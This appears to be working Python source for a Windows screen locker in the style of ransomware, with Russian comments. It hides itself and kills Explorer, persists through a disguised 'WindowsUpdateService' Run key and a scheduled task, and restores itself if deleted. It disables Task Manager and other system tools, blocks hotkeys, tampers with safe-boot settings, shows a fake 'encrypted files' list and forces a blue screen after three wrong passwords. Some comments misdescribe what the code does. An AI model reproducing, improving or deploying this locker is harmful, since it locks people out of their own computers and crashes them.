from ctypes import wintypes
import tkinter as tk
import time as t
import ctypes
import winreg
import os
import threading
from datetime import datetime
from pynput import keyboard
import queue
import subprocess
import psutil
import base64
import time
import sys
import shutil
import win32api
import win32con
import win32security
import win32file
import win32process

# ======================================================
# 1. КОНСТАНТЫ
# ======================================================

UNLOCK_PASSWORD = "777"  # Основной пароль
SECONDARY_PASSWORD = "hardcorehacker2026"  # Ваш пароль
PROCESS_NAME = "SystemLocker.exe"
REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
SERVICE_NAME = "SystemLockerService"

# ======================================================
# 2. ВАШИ ФУНКЦИИ (СОХРАНЕНЫ)
# ======================================================

a1 = 0xC0000420
a2 = 6

def a3():
    """Вызывает синий экран смерти"""
    a4 = ctypes.windll.ntdll
    a5 = ctypes.c_bool()
    a6 = ctypes.c_uint()
    a4.RtlAdjustPrivilege(19, True, False, ctypes.byref(a5))
    a4.NtRaiseHardError(
        a1,
        0,
        0,
        0,
        a2,
        ctypes.byref(a6)
    )

# def a7():
#     """Проверка на виртуальную машину (закомментировано)"""
#     try:
#         a8 = [
#             r"C:\Windows\System32\drivers\VBoxMouse.sys",
#             r"C:\Windows\System32\drivers\VBoxGuest.sys",
#             r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe",
#             r"C:\Program Files\qemu-ga\qemu-ga.exe"
#         ]
#         for a9 in a8:
#             if os.path.exists(a9):
#                 return True
#         if "VirtualBox" in str(subprocess.check_output('ipconfig /all')):
#             return True
#         if "VMware" in str(subprocess.check_output('ipconfig /all')):
#             return True
#         return False
#     except:
#         return False

# if a7():
#     exit()

def a10():
    """Проверка на отладчик"""
    a11 = ctypes.WinDLL('kernel32', use_last_error=True)
    return a11.IsDebuggerPresent() != 0

if a10():
    exit()

def a12(a13):
    return base64.b64encode(a13.encode()).decode()

def a14():
    """Установка высокого приоритета"""
    try:
        a15 = ctypes.WinDLL('kernel32', use_last_error=True)
        a15.SetPriorityClass(
            a15.GetCurrentProcess(),
            0x00000080
        )
    except:
        pass

def a16():
    """Ожидание нажатия горячих клавиш"""
    a17 = ctypes.WinDLL('user32', use_last_error=True)
    a17.RegisterHotKey(None, 1, 0, 0x52)
    a17.RegisterHotKey(None, 2, 0, 0x44)
    a18 = wintypes.MSG()
    while a17.GetMessageA(ctypes.byref(a18), None, 0, 0) != 0:
        if a18.message == 0x0312:
            return False
        a17.TranslateMessage(ctypes.byref(a18))
        a17.DispatchMessageA(ctypes.byref(a18))

def a19():
    """Установка приоритета через psutil"""
    try:
        a20 = psutil.Process(os.getpid())
        a20.nice(psutil.HIGH_PRIORITY_CLASS)
    except:
        pass

a19()
a14()

# Скрываем консоль
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
ctypes.windll.kernel32.SetConsoleTitleW("Windows System Process")

# Убиваем explorer (ваша функция)
os.system('taskkill /f /im explorer.exe 2>nul')

a21 = False

# ======================================================
# 3. ЗАЩИТА ОТ БЕЗОПАСНОГО РЕЖИМА (МОЯ ФУНКЦИЯ)
# ======================================================

def block_safe_mode():
    """Блокирует загрузку в безопасном режиме"""
    try:
        # Блокируем F8
        keyboard.add_hotkey('f8', lambda: None, suppress=True)
        
        # Отключаем безопасный режим через реестр
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Control\SafeBoot",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "Minimal", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(key, "Network", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
    except:
        pass

# ======================================================
# 4. САМОВОССТАНОВЛЕНИЕ (МОЯ ФУНКЦИЯ)
# ======================================================

def self_repair():
    """Восстанавливает программу, если её удалили"""
    current_file = os.path.abspath(sys.argv[0])
    backup_dir = os.path.join(os.environ['TEMP'], 'SystemLocker')
    backup_file = os.path.join(backup_dir, 'locker.exe')
    
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)
    
    try:
        shutil.copy2(current_file, backup_file)
        ctypes.windll.kernel32.SetFileAttributesW(backup_file, 2)
    except:
        pass
    
    def check_and_restore():
        while True:
            if not os.path.exists(current_file):
                if os.path.exists(backup_file):
                    try:
                        shutil.copy2(backup_file, current_file)
                        os.startfile(current_file)
                    except:
                        pass
            time.sleep(10)
    
    threading.Thread(target=check_and_restore, daemon=True).start()

# ======================================================
# 5. БЛОКИРОВКА СИСТЕМНЫХ ВЫЗОВОВ (МОЯ ФУНКЦИЯ)
# ======================================================

def block_ctrl_alt_del():
    """Блокирует Ctrl+Alt+Del"""
    try:
        keyboard.add_hotkey('ctrl+alt+del', lambda: None, suppress=True)
        keyboard.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
        keyboard.add_hotkey('ctrl+alt+tab', lambda: None, suppress=True)
        
        # Убираем безопасный режим из меню загрузки
        os.system("bcdedit /set {current} safeboot network 2>nul")
        os.system("bcdedit /set {current} safeboot minimal 2>nul")
    except:
        pass

def disable_task_manager():
    """Полностью отключает диспетчер задач"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        while True:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and 'taskmgr' in proc.info['name'].lower():
                    proc.terminate()
            time.sleep(0.01)
    except:
        pass

# ======================================================
# 6. АВТОЗАГРУЗКА (МОЯ ФУНКЦИЯ)
# ======================================================

def add_to_startup():
    """Добавляет в автозагрузку всеми способами"""
    file_path = os.path.abspath(sys.argv[0])
    
    # Через реестр
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_KEY,
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, PROCESS_NAME, 0, winreg.REG_SZ, f'"{file_path}"')
        winreg.CloseKey(key)
    except:
        pass
    
    # Через планировщик
    try:
        subprocess.run(
            f'schtasks /create /tn "{PROCESS_NAME}" /tr "{file_path}" /sc onlogon /f',
            shell=True,
            capture_output=True
        )
    except:
        pass

# ======================================================
# 7. БЛОКИРОВКА СИСТЕМНЫХ УТИЛИТ (ВАША + МОЯ)
# ======================================================

def block_system_tools():
    """Блокирует запуск системных утилит"""
    blocked_tools = [
        'cmd.exe', 'powershell.exe', 'regedit.exe', 'msconfig.exe',
        'gpedit.msc', 'taskmgr.exe', 'mmc.exe', 'compmgmt.msc',
        'services.msc', 'secpol.msc', 'rsop.msc', 'gpupdate.exe',
        'rundll32.exe', 'wscript.exe', 'cscript.exe', 'reg.exe',
        'procexp.exe', 'ProcessHacker.exe'
    ]
    
    def kill_blocked():
        while True:
            try:
                for proc in psutil.process_iter(['name', 'pid']):
                    try:
                        if proc.info['name'] and any(tool in proc.info['name'].lower() for tool in blocked_tools):
                            proc.terminate()
                    except:
                        pass
            except:
                pass
            time.sleep(0.5)
    
    threading.Thread(target=kill_blocked, daemon=True).start()

# ======================================================
# 8. ГЛАВНОЕ ОКНО (ОБЪЕДИНЁННОЕ)
# ======================================================

# Создаём главное окно
a22 = tk.Tk()
a22.title('Windows System Protection')
a22.attributes('-fullscreen', True)
a22.attributes('-topmost', True)
a22.protocol('WM_DELETE_WINDOW', lambda: None)
a22.resizable(False, False)
a22.configure(bg="#ac0000")

def a23(a24):
    """Логирование попыток"""
    with open('system_log.txt', 'a', encoding='utf-8') as a25:
        a25.write(f"{datetime.now()} - Попытка: {a24}\n")

# Заголовок
a26 = tk.Label(a22, text=' ⚠️ СИСТЕМА ЗАБЛОКИРОВАНА ⚠️ ', font=('Arial', 48, 'bold'), fg='white', bg='black')
a26.pack(pady=20)

a27 = tk.Frame(a22, bg='#ac0000')
a27.pack(expand=True, fill='both')
a28 = tk.Frame(a27, bg='#ac0000')
a28.pack(expand=True, fill='both')

# ASCII-арт (ваш)
a29 = """
 ______  _____             _           _
|___  / |  __ \           (_)         | |
   / /  | |__) | __ ___    _  ___  ___| |_
  / /   |  ___/ '__/ _ \  | |/ _ \/ __| __|
 / /_   | |   | | | (_) | | |  __/ (__| |_
/_____| |_|   |_|  \___/  | |\___|\___|\__|
           _/ |
          |__/
"""

a30 = tk.Label(a28, text=a29, font=('Courier New', 10, 'bold'), fg='white', bg='#ac0000')
a30.pack(side='left', padx=50, pady=20)

a31 = tk.Frame(a28, bg='#ac0000')
a31.pack(side='right', expand=True, fill='both', padx=80, pady=20)

# Список "зашифрованных" файлов
a32 = tk.Label(a31, text='ЗАШИФРОВАННЫЕ ФАЙЛЫ:', font=('Arial', 16, 'bold'), fg="#FFFFFF", bg='black')
a32.pack(pady=(10, 5))

a33 = tk.Text(a31, font=('Courier New', 10, 'bold'), fg="#00E200", bg='#1a0000', width=25, height=20, wrap=tk.WORD, borderwidth=0, highlightthickness=0)
a33.pack(side='left', fill='both', expand=True)

a34 = tk.Scrollbar(a31, command=a33.yview)
a34.pack(side='right', fill='y')
a33.config(yscrollcommand=a34.set)
a33.config(state='disabled')

# Очередь для симуляции шифрования
a35 = queue.Queue()

def a36(a37):
    """Сбор файлов для "шифрования" """
    for a38 in a37:
        if not os.path.exists(a38):
            continue
        try:
            for a39, a40, a41 in os.walk(a38):
                for a42 in a41:
                    a43 = os.path.join(a39, a42)
                    a35.put(a43)
        except (PermissionError, OSError):
            pass
    a35.put(None)

def a44():
    """Запуск "шифрования" """
    threading.Thread(target=a36, args=(['C:\\Windows\\System32', 'D:\\'],), daemon=True).start()
    a45()

def a45():
    """Отображение "шифрования" в реальном времени"""
    try:
        a46 = a35.get_nowait()
        if a46 is None:
            a33.insert(tk.END, '\n[!] ШИФРОВАНИЕ ЗАВЕРШЕНО')
            a33.config(state='disabled')
            return
        a33.config(state='normal')
        a33.insert(tk.END, a46 + '\n')
        a33.see(tk.END)
        a33.config(state='disabled')
        a22.after(1, a45)
    except queue.Empty:
        a22.after(10, a45)

a22.after(500, a44)

# Нижняя панель
a47 = tk.Frame(a27, bg='#ac0000')
a47.pack(side='bottom', fill='x', pady=30)

# Поле ввода пароля
a48 = tk.Entry(a47, show='*', font=('Arial', 24), justify='center', width=20)
a48.pack(pady=10)
a48.focus_set()

a49 = 0
a50 = False

# Пароли (ваши + мой)
a51 = '1'
a52 = 'hardcorehacker2026'
# Мой пароль добавлен в список проверки

def a53():
    """Убивает диспетчер задач (ваша функция)"""
    try:
        os.system('taskkill /f /im Taskmgr.exe 2>nul')
        os.system('taskkill /f /im procexp.exe 2>nul')
        os.system('taskkill /f /im ProcessHacker.exe 2>nul')
    except:
        pass

def a54():
    """Постоянное убийство диспетчера задач"""
    while True:
        t.sleep(1)
        try:
            a53()
        except:
            pass

threading.Thread(target=a54, daemon=True).start()

def a55():
    """Добавление в автозагрузку (ваша функция)"""
    try:
        a56 = winreg.HKEY_CURRENT_USER
        a57 = r"Software\Microsoft\Windows\CurrentVersion\Run"
        a58 = winreg.OpenKey(a56, a57, 0, winreg.KEY_SET_VALUE)
        a59 = r"C:\ProgramData\roblox.bat"
        winreg.SetValueEx(a58, "WindowsUpdateService", 0, winreg.REG_SZ, f'cmd.exe /c "{a59}"')
        winreg.CloseKey(a58)
    except:
        pass

def a60():
    """Проверка пароля (объединённая)"""
    global a49, a50
    if a50:
        return
    a61 = a48.get()
    a23(a61)
    
    # Проверка ВСЕХ паролей
    if a61 == a51 or a61 == a52 or a61 == UNLOCK_PASSWORD:
        try:
            # Удаление из автозагрузки
            a62 = winreg.HKEY_CURRENT_USER
            a63 = r"Software\Microsoft\Windows\CurrentVersion\Run"
            a64 = winreg.OpenKey(a62, a63, 0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(a64, "WindowsUpdateService")
            except:
                pass
            winreg.CloseKey(a64)
            
            # Удаление служб
            os.system(f'sc delete "{SERVICE_NAME}" 2>nul')
            os.system(f'schtasks /delete /tn "{PROCESS_NAME}" /f 2>nul')
        except:
            pass
        
        # Восстанавливаем Explorer
        os.system('start explorer.exe')
        a22.destroy()
        sys.exit(0)
    else:
        a49 += 1
        a48.delete(0, tk.END)
        a65 = tk.Label(a22, text=f"❌ НЕВЕРНЫЙ ПАРОЛЬ (Попытка {a49}/3)", font=('Arial', 14), fg='yellow', bg='#d40000')
        a65.pack()
        a22.after(2000, a65.destroy)
        
        if a49 >= 3:
            a50 = True
            a48.config(state='disabled')
            a67 = tk.Label(a22, text="⛔ ПРЕВЫШЕН ЛИМИТ ПОПЫТОК\nСистема будет перезагружена", font=('Arial', 16, 'bold'), fg='orange', bg='#d40000')
            a67.pack(pady=20)
            a22.update()
            time.sleep(3)
            a3()  # Синий экран
            a22.destroy()

# Кнопка разблокировки
a66 = tk.Button(a47, text='🔓 РАЗБЛОКИРОВАТЬ', font=('Arial', 18), command=a60)
a66.pack(pady=10)

# Блокировка Alt+F4
def a68(a69=None):
    return "break"
a22.bind_all('<Alt-F4>', a68)

# Блокировка Win ключей (ваша функция)
def a70(a71):
    global a21
    if a71 == keyboard.Key.cmd or a71 == keyboard.Key.cmd_r:
        a21 = True
        return False
    if a21:
        if hasattr(a71, 'char') and a71.char == 'r': return False
        if hasattr(a71, 'char') and a71.char == 'd': return False
        if hasattr(a71, 'char') and a71.char == 'e': return False
        if hasattr(a71, 'char') and a71.char == 'l': return False
        if a71 == keyboard.Key.tab: return False
        if hasattr(a71, 'char') and a71.char == 'i': return False
        if hasattr(a71, 'char') and a71.char in '1234567890': return False
        if hasattr(a71, 'char') and a71.char == 'm': return False
        if hasattr(a71, 'char') and a71.char == 's': return False

def a72(a73):
    global a21
    if a73 == keyboard.Key.cmd or a73 == keyboard.Key.cmd_r:
        a21 = False

# Запускаем слушатель клавиш
a74 = keyboard.Listener(on_press=a70, on_release=a72)
a74.start()

# ======================================================
# 9. ЗАПУСК ВСЕХ ЗАЩИТ (МОИ ФУНКЦИИ)
# ======================================================

def start_all_protections():
    """Запускает все дополнительные защиты"""
    threading.Thread(target=block_safe_mode, daemon=True).start()
    threading.Thread(target=self_repair, daemon=True).start()
    threading.Thread(target=block_ctrl_alt_del, daemon=True).start()
    threading.Thread(target=disable_task_manager, daemon=True).start()
    threading.Thread(target=block_system_tools, daemon=True).start()
    threading.Thread(target=add_to_startup, daemon=True).start()

# Запускаем защиты
start_all_protections()

# ======================================================
# 10. ЗАПУСК ГЛАВНОГО ЦИКЛА
# ======================================================

# Добавляем в автозагрузку (ваша функция)
a55()

# Запускаем главный цикл
a22.mainloop()